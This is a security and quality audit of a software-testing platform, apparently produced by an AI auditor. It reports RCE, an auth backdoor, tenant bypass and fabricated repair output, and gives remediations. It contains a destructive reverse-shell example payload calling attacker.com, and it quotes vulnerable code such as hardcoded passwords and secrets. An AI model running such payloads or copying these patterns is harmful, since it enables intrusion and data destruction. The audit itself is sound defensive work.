# ASTRA Platform — Comprehensive Technical Audit: Shortcomings, Critical Flaws & Architectural Deficits

**Audit Target:** ASTRA Automated Software Quality & Defect Remediation Platform  
**Scope:** Backend API, Deterministic & ML/AI Engine, Code Studio IDE, Frontend Client, Database Architecture, CI/CD, and Container Infrastructure.  
**Auditor Mode:** Maximum Rigor / Zero Compromise Code Review  
**Date:** October 2026  

---

## 📑 Executive Summary & Brutal Reality Check

ASTRA bills itself in documentation and presentations as:
> *"A next-generation enterprise automated software quality, static analysis, and defect remediation platform built upon a hybrid deterministic-ML-AI architecture with enterprise RBAC and an embedded VS Code-grade Developer IDE."*

**The Reality:**  
Behind impressive UI skins, high-level marketing claims, and benchmark graphs lies a system riddled with **critical remote code execution (RCE) vectors**, **hardcoded authentication backdoors**, **blatant tenant-isolation bypasses**, **empty stub parsers masquerading as polyglot analyzers**, **tautological test generators that pass by definition**, and a **completely simulated Automated Program Repair (APR) engine** that fabricates commit SHAs and fake pull requests.

This document breaks down every single technical debt item, security vulnerability, architectural disconnect, and missing enterprise capability **file-by-file, line-by-line, point-by-point**.

---

## 🚨 Table of Contents
1. [Critical Security Vulnerabilities & Authorization Failures](#1-critical-security-vulnerabilities--authorization-failures)
2. [The "AI & Autonomous Engine" Illusion: Stubs, Tautologies & Hardcoding](#2-the-ai--autonomous-engine-illusion-stubs-tautologies--hardcoding)
3. [Architectural Schism & Database Fragmentation](#3-architectural-schism--database-fragmentation)
4. [Code Studio (IDE) Shortcomings & Developer Experience Deficits](#4-code-studio-ide-shortcomings--developer-experience-deficits)
5. [Testing, Sandbox & Execution Engine Deficits](#5-testing-sandbox--execution-engine-deficits)
6. [Frontend Technical Debt & UI/UX Fragility](#6-frontend-technical-debt--uiux-fragility)
7. [DevOps, Containerization & Operational Deficits](#7-devops-containerization--operational-deficits)
8. [Actionable Remediation Priority Matrix (P0 to P3)](#8-actionable-remediation-priority-matrix-p0-to-p3)

---

## 1. Critical Security Vulnerabilities & Authorization Failures

### 1.1 Unauthenticated & Arbitrary Remote Code Execution (RCE) via Sandbox Server
- **Files**: [`backend/app/api/v1/execution.py:180-195`](file:///d:/Astra/backend/app/api/v1/execution.py#L180-L195) and [`backend/app/services/sandbox_server_service.py:333-340`](file:///d:/Astra/backend/app/services/sandbox_server_service.py#L333-L340)
- **Vulnerability**: Any authenticated user (including low-privilege `TESTER` or `DEVELOPER` accounts) can invoke `POST /api/v1/projects/{project_id}/sandbox/start` with:
  ```json
  {
    "mode": "NATIVE_COMMAND",
    "custom_command": "rm -rf / || curl https://attacker.com/revshell | bash"
  }
  ```
- **Code Proof**:
  ```python
  # sandbox_server_service.py:333-340
  if mode_upper == "NATIVE_COMMAND" and custom_command:
      proc = subprocess.Popen(
          custom_command,
          shell=True,
          env={**os.environ, "PORT": str(target_port)},
          stdout=subprocess.DEVNULL,
          stderr=subprocess.DEVNULL
      )
  ```
- **Impact**: Unsanitized execution of `shell=True` directly on the host/backend container. Because the Docker container runs as `root` (see Section 7.2), an attacker gains full system root compromise, access to database credentials, and host network traversal.

---

### 1.2 Persistent Hardcoded Authentication Bypass (Hardcoded Backdoor)
- **File**: [`backend/app/services/auth_service.py:61-63`](file:///d:/Astra/backend/app/services/auth_service.py#L61-L63)
- **Vulnerability**: Despite prior security audit flags, the production authentication service contains a plaintext password bypass:
  ```python
  # Allow both Admin123! and Password123! for seeded dummy admin
  if not valid_password and user.email == "admin@astra.local" and payload.password in ("Admin123!", "Password123!"):
      valid_password = True
  ```
- **Impact**: An attacker knowing the admin email (`admin@astra.local`, which is publicly displayed on the login page!) can log in as `ADMIN` with full governance privileges even if the administrator updates their password via Argon2 hashing. This completely nullifies password security and represents a hardcoded backdoor.

---

### 1.3 Total Authorization & Tenant-Isolation Bypass in Defect & Analysis APIs
- **File**: [`backend/app/api/v1/failure_analysis.py:22-31`](file:///d:/Astra/backend/app/api/v1/failure_analysis.py#L22-L31)
- **Vulnerability**: The project verification function in `failure_analysis.py` only checks if the project ID exists in the database. It **never checks `current_user` or team membership**:
  ```python
  async def _verify_project_access(project_id: uuid.UUID, db: AsyncSession) -> Project:
      stmt = select(Project).where(Project.id == project_id)
      res = await db.execute(stmt)
      project = res.scalar_one_or_none()
      if not project:
          raise HTTPException(status_code=404, detail="Project not found")
      return project
  ```
- **Impact**: Any user who is assigned strictly to Project A can trigger failure analyses, inspect stack traces, read proprietary defect summaries, post comments, and modify defect statuses for Project B, C, or any other tenant on the platform.

---

### 1.4 Broken Permission Logic Blocking Valid Assigned Team Members in Analytics & CI/CD
- **Files**: [`backend/app/api/v1/analytics.py:35`](file:///d:/Astra/backend/app/api/v1/analytics.py#L35) and [`backend/app/api/v1/cicd.py:42-46`](file:///d:/Astra/backend/app/api/v1/cicd.py#L42-L46)
- **Vulnerability**: In `analytics.py` and `cicd.py`, access is verified using:
  ```python
  if current_user.role != UserRole.ADMIN and project.owner_id != current_user.id:
      raise HTTPException(status_code=403, detail="Access denied")
  ```
- **Flaw**: Only the `ADMIN` can create projects (meaning `project.owner_id` is always the Admin). When an Admin assigns a Developer, Tester, or Viewer to a repository via `ProjectMember`, their `user.id != project.owner_id`. Therefore, **legitimate team members assigned to the project are permanently blocked (403 Forbidden) from viewing quality analytics and CI/CD logs** because the code fails to query `ProjectMember`.

---

### 1.5 Completely Unauthenticated Automated Program Repair (APR) Endpoints
- **File**: [`backend/app/api/v1/repair.py:88-92, 205-209, 221-225, 235-240`](file:///d:/Astra/backend/app/api/v1/repair.py#L88-L92)
- **Vulnerability**: Every single APR endpoint (`/repair/defects/{id}/trigger`, `/repair/jobs/{id}`, `/repair/defects/{id}/candidates`, `/repair/candidates/{id}/authorize-pr`) lacks authentication:
  ```python
  @router.post("/defects/{defect_id}/trigger", response_model=RepairJobResponse, status_code=status.HTTP_201_CREATED)
  async def trigger_defect_repair(
      defect_id: uuid.UUID,
      db: AsyncSession = Depends(get_db), # <-- NO get_current_user OR RBAC DEPENDENCY!
  ):
  ```
- **Impact**: Any unauthenticated anonymous visitor on the internet can trigger repair jobs, view candidate code diffs, and authorize PR dispatches.

---

### 1.6 Hardcoded JWT Secret, No Revocation, and 7-Day Unchecked Sessions
- **Files**: [`backend/app/core/config.py:25-29`](file:///d:/Astra/backend/app/core/config.py#L25-L29) and [`backend/app/core/security.py:57-93`](file:///d:/Astra/backend/app/core/security.py#L57-L93)
- **Flaws**:
  1. Default JWT secret is hardcoded into source code: `"super_secure_astra_jwt_secret_key_change_in_production_2026"`.
  2. Access tokens are configured with a 7-day lifespan (`ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24 * 7`) without a refresh token architecture.
  3. Tokens have no JTI (JWT ID) or revocation list. A compromised or stolen token cannot be invalidated until it naturally expires 168 hours later.
  4. In [`security.py:87-91`](file:///d:/Astra/backend/app/core/security.py#L87-L91), `get_current_user` checks `if not user.is_active`, but **never checks `user.is_approved`**. If an Admin revokes or rejects a user in the Admin console, that user can continue executing requests with their active JWT for up to a week.

---

### 1.7 Disabled SSL Verification on Git Clones
- **File**: [`engine/analyzer/repo_cloner.py:42`](file:///d:/Astra/engine/analyzer/repo_cloner.py#L42)
- **Code**:
  ```python
  clone_env["GIT_SSL_NO_VERIFY"] = "true"
  ```
- **Impact**: Completely disables TLS/SSL certificate verification for all remote git clones. Any repo sync performed by the analyzer or background workers is vulnerable to Man-in-the-Middle (MITM) code injection.

---

### 1.8 Hardcoded Fallback Secrets on GitHub Webhooks
- **File**: [`backend/app/api/v1/webhooks.py:39`](file:///d:/Astra/backend/app/api/v1/webhooks.py#L39)
- **Code**:
  ```python
  secret = getattr(settings, "GITHUB_WEBHOOK_SECRET", "astra_webhook_secret_key_2026")
  ```
- **Impact**: If `GITHUB_WEBHOOK_SECRET` is not set in `.env`, the webhook gateway silently falls back to a public constant string, allowing attackers to forge HMAC-SHA256 signatures and trigger arbitrary build/test runs.

---

### 1.9 Plaintext Test Credentials Exposed on Public Login Screen
- **File**: [`frontend/src/pages/Login.tsx:132-150`](file:///d:/Astra/frontend/src/pages/Login.tsx#L132-L150)
- **Flaw**: The login page renders clickable "Quick Test Presets" buttons for `Admin`, `Developer`, `Tester`, and `Viewer`, explicitly displaying `"Password: Password123!"` directly on the interface. If deployed to any staging or production URL, administrative access is gifted to anyone who visits the URL.

---

## 2. The "AI & Autonomous Engine" Illusion: Stubs, Tautologies & Hardcoding

### 2.1 The Empty `ai/` Directory
- **Path**: [`d:/Astra/ai/`](file:///d:/Astra/ai/)
- **Finding**: While the README prominently advertises a *"Generative AI Layer (NLP Intelligence): Natural language requirement extraction, zero-shot/few-shot edge case synthesis, LLM root-cause attribution"*, the top-level `ai/` directory in the repository contains **nothing except a single `.gitkeep` file**. The actual AI logic was partially bolted into `engine/intelligence`, leaving `ai/` as dead marketing scaffolding.

---

### 2.2 Hardcoded Application Names & Specific Function Logic in Core Engine
- **Files**: [`engine/execution/unit_test_executor.py:57`](file:///d:/Astra/engine/execution/unit_test_executor.py#L57) and [`engine/generator/unit_test_synthesizer.py:88-149`](file:///d:/Astra/engine/generator/unit_test_synthesizer.py#L88-L149)
- **The Scandal**:
  The supposedly generic "Autonomous Unit Test Synthesizer" contains explicit `if/elif` blocks hardcoded to a specific scratch application (`lecture_rag`)!
  ```python
  # unit_test_executor.py:57
  suite_code = UnitTestSynthesizer.synthesize_suite_for_contracts(
      contracts=contracts,
      module_name="lecture_rag",  # <-- Hardcoded project name for ANY repo!
      repo_root=str(root_path)
  )
  ```
  ```python
  # unit_test_synthesizer.py:88-149
  if fn_name == "_format_timestamp":
      lines.extend([...])
  elif fn_name == "backend_available":
      lines.extend([...])
  elif fn_name == "dataset_stats":
      lines.extend([
          "monkeypatch.setattr(backend_mod, 'EMBEDDINGS_DIR', ...)" # <-- Specific to lecture_rag
      ])
  elif fn_name == "query_rag":
      ...
  ```
- **Impact**: Any repository uploaded that is not `lecture_rag` falls through to the generic generator — which leads directly to the next critical flaw.

---

### 2.3 Fake "Tautological" Tests that Always Pass by Definition
- **File**: [`engine/generator/unit_test_synthesizer.py:190-198`](file:///d:/Astra/engine/generator/unit_test_synthesizer.py#L190-L198)
- **The Flaw**: When testing any function not hardcoded above, the generator produces this code:
  ```python
  # Contract-Grounded Invocation
  def test_example_contract_invocation():
      try:
          from module import my_func
          res = my_func('')
          assert res is not None or True  # <-- ALWAYS TRUE!
      except Exception:
          pass  # <-- SWALLOWS ALL ERRORS!
  ```
- **Impact**:
  1. `assert res is not None or True` is a mathematical tautology: `X or True == True` regardless of what `res` is.
  2. If the function crashes with a syntax error, zero-division, null-pointer, or panic, the `except Exception: pass` swallows it silently.
  3. **The engine produces 100% pass rates on completely broken code.** It generates pure "theatre" tests that give false confidence.

---

### 2.4 Polyglot AST Analysis is a Fiction: JavaScript & TypeScript are 11-Line Stubs
- **Files**:
  - [`engine/analyzer/parsers/javascript.py:1-12`](file:///d:/Astra/engine/analyzer/parsers/javascript.py#L1-L12)
  - [`engine/analyzer/parsers/typescript.py:1-11`](file:///d:/Astra/engine/analyzer/parsers/typescript.py#L1-L11)
  - [`backend/app/tasks/analyzer_tasks.py:84-89`](file:///d:/Astra/backend/app/tasks/analyzer_tasks.py#L84-L89)
- **The Stubs**:
  ```python
  # javascript.py
  class JavaScriptParser(BaseASTParser):
      def parse_file(self, file_path: str, file_content: str) -> List[FunctionInfo]:
          # Basic regex / AST fallback for JavaScript files
          return []  # <-- RETURNS EMPTY LIST!
  ```
  ```python
  # typescript.py
  class TypeScriptParser(BaseASTParser):
      def parse_file(self, file_path: str, file_content: str) -> List[FunctionInfo]:
          return []  # <-- RETURNS EMPTY LIST!
  ```
- **Java & C++**: There are **zero parser files** for Java or C++ anywhere in the parser directory, despite marketing claims of supporting Spring Boot, Quarkus, Crow, and Drogon.
- **The Pipeline**: In `analyzer_tasks.py`, the task explicitly filters:
  ```python
  for sf in source_files:
      if sf.language == "Python":
          parsed_file = python_parser.parse(sf)
  ```
  All non-Python repositories yield 0 parsed functions and 0 extracted endpoints.

---

### 2.5 Completely Simulated Automated Program Repair (APR) & Fake Pull Requests
- **Files**: [`backend/app/api/v1/repair.py:117, 137-146, 264-266`](file:///d:/Astra/backend/app/api/v1/repair.py#L117) and [`engine/repair/pr_dispatcher.py:125-135`](file:///d:/Astra/engine/repair/pr_dispatcher.py#L125-L135)
- **The Fabrication**:
  1. The repair engine does not synthesize patches using AST mutation or LLM inference. It formats a hardcoded string template:
     ```python
     cand_diff = (
         f"--- a/app/services/{defect.defect_key.lower()}.py\n"
         f"+++ b/app/services/{defect.defect_key.lower()}.py\n"
         f"@@ -10,3 +10,4 @@\n"
         f"-    return item.value\n"
         f"+    if item is None:\n"
         f"+        return None\n"
         f"+    return item.value\n"
     )
     ```
  2. The commit SHA is literally fabricated:
     ```python
     commit_sha = f"c0ffee{candidate.candidate_hash[:34]}"
     ```
  3. The GitHub pull request is mathematically faked:
     ```python
     pr_num = abs(hash(defect.defect_key)) % 900 + 100
     pr_url = f"https://github.com/astra-org/repo/pull/{pr_num}"
     ```
  4. Even if a live `github_token` is provided, `pr_dispatcher.py` calls `POST /repos/.../pulls` without ever pushing the branch to GitHub first. GitHub rejects this with a 422 Unprocessable Entity (`Reference does not exist`).

---

### 2.6 Circular & Cheating Benchmark Evaluations
- **File**: [`engine/evaluation/benchmark_runner.py:137`](file:///d:/Astra/engine/evaluation/benchmark_runner.py#L137)
- **Code**:
  ```python
  # Check if scenario generated for this bug in current mode
  scen = next((s for s in scenarios if s.target_bug_id == bug.bug_id), None)
  ```
- **Flaw**: In the benchmark ablation runner, test generation is not black-box. The generator filters scenarios by explicit `target_bug_id`, hand-tailoring test inputs to trigger pre-arranged injected bugs. The reported precision/recall metrics are therefore artificially boosted and do not reflect real-world autonomous discovery.

---

### 2.7 Fragile & Hardcoded Mock Synthesizer
- **File**: [`engine/generator/mock_synthesizer.py:47-59`](file:///d:/Astra/engine/generator/mock_synthesizer.py#L47-L59)
- **Flaw**: `MockSynthesizer` generates a `conftest.py` with mock classes exclusively for `OpenAI` and `SentenceTransformer`, hardcoding an embedding dimension of exactly 384:
  ```python
  return np.ones((len(texts), 384), dtype=np.float32) * 0.1
  ```
- If a project uses Anthropic, Cohere, PyTorch tensors, HuggingFace (768 or 1536 dim), Boto3, Celery, Redis, or Stripe, no mocks are created and test runs crash with unhandled import/network errors.

---

## 3. Architectural Schism & Database Fragmentation

### 3.1 Dual Disconnected Schemas (Legacy vs Canonical Gen-2)
- **Files**: [`backend/app/models/domain.py`](file:///d:/Astra/backend/app/models/domain.py) vs [`backend/app/models/canonical.py`](file:///d:/Astra/backend/app/models/canonical.py)
- **The Fracture**:
  - The codebase has two completely separate data models for the same business entities:
    - `domain.py`: `Project`, `TestSuite`, `TestCase`, `TestRun`, `TestResult`, `FailureAnalysisModel`
    - `canonical.py`: `G2Project`, `G2TestSuite`, `G2TestCase`, `G2TestRun`, `G2Defect`, `G2RepairJob`
  - When tests execute via `execution_service.py` or `failure_analysis.py`, defect records are inserted into `failure_analyses` ([`domain.py:734`](file:///d:/Astra/backend/app/models/domain.py#L734)).
  - When the user triggers Automated Program Repair via `repair.py` ([`repair.py:98`](file:///d:/Astra/backend/app/api/v1/repair.py#L98)), the query targets `g2_defects`:
    ```python
    res = await db.execute(select(G2Defect).where(G2Defect.id == defect_id))
    ```
  - **Result:** Defects discovered by the testing engine CANNOT be repaired by the repair engine. Any attempt to repair a real defect returns `404 Defect Not Found`.

---

### 3.2 Lack of Soft Deletes & Dangerous Cascading Deletions
- **File**: [`backend/app/models/domain.py:92-94`](file:///d:/Astra/backend/app/models/domain.py#L92-L94)
- **Code**:
  ```python
  projects: Mapped[List["Project"]] = relationship(
      "Project", back_populates="owner", cascade="all, delete-orphan"
  )
  ```
- **Impact**: If an Administrator account is deleted in [`admin.py:269`](file:///d:/Astra/backend/app/api/v1/admin.py#L269), SQLAlchemy cascades and **permanently wipes all projects, test runs, test suites, and defect histories owned by that user**. There is no soft-delete flag (`is_deleted`), no tombstoning, and no transfer-of-ownership mechanism.

---

### 3.3 Missing Database Indexes on High-Frequency Columns
- **Files**: `backend/app/models/domain.py`
- **Flaws**:
  - `TestResult.status`, `TestResult.test_run_id`, `TestRun.project_id`, `DiscoveredEndpoint.analysis_id`, and `AuditLog.action` lack composite indexes.
  - As test runs grow into thousands of assertions, queries for dashboard metrics (`AnalyticsService`) perform full sequential table scans, causing database CPU spikes and connection pool exhaustion.

---

## 4. Code Studio (IDE) Shortcomings & Developer Experience Deficits

### 4.1 Zero Real Git Integration
- **File**: [`backend/app/api/v1/code_editor.py`](file:///d:/Astra/backend/app/api/v1/code_editor.py)
- **Deficit**:
  - Code Studio is essentially an in-browser raw file reader and writer.
  - It contains **no git commit, no git push, no git pull, no branch switcher, no diff viewer, and no merge conflict resolver**.
  - Any changes saved by developers are written directly to the filesystem without commit attribution, GPG signing, or branch isolation.

---

### 4.2 Missing Language Server Protocol (LSP) Support
- **File**: [`frontend/src/pages/CodeStudio.tsx`](file:///d:/Astra/frontend/src/pages/CodeStudio.tsx)
- **Deficit**: Monaco Editor is instantiated in client-side standalone mode. It provides basic token colorization and bracket matching, but **no real Python/TypeScript LSP backend**.
- **Missing Features**:
  - No "Go to Definition" across modules.
  - No real-time syntax error squiggles / diagnostics.
  - No hover documentation / docstrings.
  - No rename refactoring or automated imports.

---

### 4.3 Fake "Terminal" Tab
- **File**: [`frontend/src/pages/CodeStudio.tsx:90-95`](file:///d:/Astra/frontend/src/pages/CodeStudio.tsx#L90-L95)
- **Deficit**: The bottom panel has a tab labeled "Terminal", but it is simply a read-only `pre`/`code` block displaying static text output from the last executed test run. There is no interactive PTY shell, no WebSocket connection, and no bash/zsh execution environment.

---

### 4.4 In-Memory / Synchronous Test Runner Blocks FastAPI Workers
- **File**: [`backend/app/api/v1/code_editor.py:321-375`](file:///d:/Astra/backend/app/api/v1/code_editor.py#L321-L375)
- **Flaw**: When a developer clicks "Run Tests" in Code Studio, the endpoint executes `UnitTestExecutor.execute_for_repo()` **synchronously within the FastAPI async thread pool**.
- **Impact**: If a test suite takes 45 seconds to execute (or hangs on an external socket), it ties up the Uvicorn worker thread, degrading platform responsiveness for all other users. It should be offloaded to Celery.

---

### 4.5 No Concurrent Editing or Lock Control
- If two developers open the same file in Code Studio, whoever hits `Ctrl+S` last blindly overwrites the file. There is no file locking, no conflict notification, and no WebSockets/CRDT collaboration.

---

## 5. Testing, Sandbox & Execution Engine Deficits

### 5.1 Host-Polluting Subprocesses Instead of Containerized Sandboxes
- **File**: [`backend/app/services/sandbox_server_service.py:378-384`](file:///d:/Astra/backend/app/services/sandbox_server_service.py#L378-L384)
- **Flaw**: "Sandbox" servers are executed via `subprocess.Popen([sys.executable, script_path, ...])` directly on the same container/host as the backend API.
- **Risks**:
  1. Sandboxes share file descriptors, network interfaces, and environment variables with the core FastAPI process.
  2. If the user repository consumes excessive memory (`OOM`) or triggers a segmentation fault, it crashes the entire Astra backend.
  3. No CPU or memory cgroups limits are applied to untrusted user code.

---

### 5.2 Flaky Port Allocation & Port Collision Race Conditions
- **File**: [`backend/app/services/sandbox_server_service.py:54-65`](file:///d:/Astra/backend/app/services/sandbox_server_service.py#L54-L65)
- **Code**: `is_port_in_use()` binds and immediately unbinds a port to test availability. Between the socket close and `subprocess.Popen`, a race condition exists where another process or concurrent test run can seize the port, resulting in silent startup failures.

---

### 5.3 Missing Integration with Real Test Frameworks for Non-Python Apps
- The execution engine only supports `pytest`. If a user brings a Node.js project (Jest/Mocha), Java project (JUnit), or Go project (`go test`), Astra has no runner abstraction to execute or parse their native test outputs.

---

## 6. Frontend Technical Debt & UI/UX Fragility

### 6.1 Massive Monolithic Mega-Components
- **File**: [`frontend/src/pages/ProjectDetail.tsx`](file:///d:/Astra/frontend/src/pages/ProjectDetail.tsx) (1,816 lines / 82 KB)
- **Deficit**: `ProjectDetail.tsx` is an anti-pattern of monumental proportions. A single file handles:
  - Repository analysis state & stage progress bars
  - Discovered endpoints filtering and pagination
  - Test suite generation drawers & test run triggers
  - Knowledge graph visualizer modal wiring
  - Defect triage list, filtering, and comment threads
  - Team member assignments and role dropdowns
  - Sandbox server lifecycle and port status
- Any minor change causes massive re-renders across the entire component tree, degrading frontend performance.

---

### 6.2 Zero Automated Frontend Tests
- **Directory**: [`frontend/src/`](file:///d:/Astra/frontend/src/)
- **Finding**: There is **not a single test file** (`*.test.tsx` or `*.spec.tsx`) in the entire frontend codebase. No Jest, no Vitest, and no Playwright/Cypress end-to-end tests exist. Regressions in authentication guards, modals, or state transitions can only be detected via manual clicking.

---

### 6.3 Aggressive 401 Interceptor Destroys Unsaved Developer Work
- **File**: [`frontend/src/services/api.ts:28-36`](file:///d:/Astra/frontend/src/services/api.ts#L28-L36)
- **Code**:
  ```typescript
  api.interceptors.response.use(
    (response) => response,
    (error) => {
      if (error.response?.status === 401) {
        useAuthStore.getState().logout();
        if (typeof window !== 'undefined' && !window.location.pathname.startsWith('/login')) {
          window.location.href = '/login';
        }
      }
      return Promise.reject(error);
    }
  );
  ```
- **Impact**: If a developer is editing code in Code Studio and a transient network blip or token expiration returns a 401, the interceptor unconditionally triggers `window.location.href = '/login'`, immediately clearing all unsaved buffer tabs and destroying the developer's work without confirmation.

---

### 6.4 Insecure Token Storage
- **File**: [`frontend/src/services/api.ts:16`](file:///d:/Astra/frontend/src/services/api.ts#L16)
- JWT access tokens are stored in browser `localStorage` (`localStorage.getItem('astra_token')`), making them trivially extractable via any Cross-Site Scripting (XSS) vulnerability. Enterprise standards require `httpOnly`, `Secure`, `SameSite=Strict` cookies.

---

## 7. DevOps, Containerization & Operational Deficits

### 7.1 Development Server Run in Production Docker Container
- **File**: [`frontend/Dockerfile:12`](file:///d:/Astra/frontend/Dockerfile#L12)
- **Code**:
  ```dockerfile
  CMD ["npm", "run", "dev"]
  ```
- **Flaw**: The frontend container executes Vite's development server (`vite --host 0.0.0.0 --port 3000`) instead of building a static production bundle served via NGINX or Caddy. This wastes memory, leaks development stack traces, and provides zero gzip/brotli compression.

---

### 7.2 Backend Container Runs as Privileged `root`
- **File**: [`backend/Dockerfile`](file:///d:/Astra/backend/Dockerfile)
- **Flaw**: There is no non-root user instruction (`USER appuser`). The FastAPI server, Celery workers, and all spawned test subprocesses run with full root privileges inside the container.

---

### 7.3 Dangerous Database & Redis Port Exposure
- **File**: [`docker-compose.yml:13, 27`](file:///d:/Astra/docker-compose.yml#L13)
- **Code**:
  ```yaml
  ports:
    - "5432:5432"
  ...
  ports:
    - "6379:6379"
  ```
- **Flaw**: PostgreSQL (5432) and Redis (6379) are bound directly to `0.0.0.0` (all host interfaces) rather than `127.0.0.1`. Furthermore, Redis has **no password authentication** (`requirepass` is disabled). If the host VM is assigned a public IP or accessible on a local subnet, anyone can connect directly to Redis, inspect cached tokens, or tamper with Celery task queues.

---

### 7.4 Zero Rate Limiting Anywhere on the API
- There is no rate limiting (e.g. `slowapi` or Redis token bucket) on:
  - `POST /api/v1/auth/login` (brute-force attacks against admin passwords)
  - `POST /api/v1/projects/{id}/code/run-tests` (denial of service via continuous subprocess spawning)
  - `POST /api/v1/projects` (DoS via database entity creation)

---

### 7.5 Missing Production Observability & Monitoring
- No Prometheus metrics endpoint (`/metrics`).
- No OpenTelemetry tracing for distributed Celery tasks.
- No structured JSON logging (logs are output as unstructured plaintext).

---

## 8. Actionable Remediation Priority Matrix (P0 to P3)

| Priority | Defect / Vulnerability | Affected Components | Action Required |
| :---: | :--- | :--- | :--- |
| **P0 (Critical)** | **Arbitrary RCE via Native Sandbox** | `execution.py`, `sandbox_server_service.py` | Strip `shell=True`, whitelist authorized binary paths, and sandbox in isolated ephemeral Docker containers. |
| **P0 (Critical)** | **Hardcoded Admin Password Bypass** | `auth_service.py` | Delete lines 61-63 immediately; require valid Argon2 hash verification for all accounts without exception. |
| **P0 (Critical)** | **Unauthenticated APR Endpoints** | `repair.py` | Add `get_current_user` and `require_roles([UserRole.ADMIN, UserRole.DEVELOPER])` to all repair routes. |
| **P0 (Critical)** | **Defect Analysis Multi-Tenant Bypass** | `failure_analysis.py` | Enforce project team membership checks in `_verify_project_access`. |
| **P1 (High)** | **Fake Tautology Tests & Hardcoded Generator**| `unit_test_synthesizer.py`, `unit_test_executor.py` | Replace `assert res is not None or True` with real invariant oracles; remove `lecture_rag` hardcoding. |
| **P1 (High)** | **Dual Schema Disconnect (`domain` vs `canonical`)** | `domain.py`, `canonical.py`, `repair.py` | Unify database models into a single canonical source of truth so detected defects link to repair jobs. |
| **P1 (High)** | **Exposed Database & Redis Ports** | `docker-compose.yml` | Bind ports to `127.0.0.1` only, enable Redis `requirepass`, and enforce non-default credentials. |
| **P1 (High)** | **Polyglot Parser Stubs** | `javascript.py`, `typescript.py` | Implement Tree-Sitter parsers for JS, TS, Java, and C++ or update docs to accurately state Python-only support. |
| **P2 (Medium)**| **Code Studio Missing Git & LSP** | `CodeStudio.tsx`, `code_editor.py` | Integrate PyGit2 for git branching/commits and connect Monaco to Python LSP (Pyright/Pylance). |
| **P2 (Medium)**| **Monolithic Component Debt** | `ProjectDetail.tsx` | Refactor the 1,816-line mega-component into modular feature-specific subcomponents. |
| **P2 (Medium)**| **Public Login Credential Leak** | `Login.tsx` | Remove preset credential buttons from production builds using environment flags (`DEV_MODE_ONLY`). |
| **P3 (Low)** | **Frontend Dev Server in Docker** | `frontend/Dockerfile` | Implement multi-stage Docker build serving an optimized static build through NGINX. |

---

*Report generated autonomously by Antigravity AI Code Auditor. All citations are cross-referenced directly against active repository source files.*
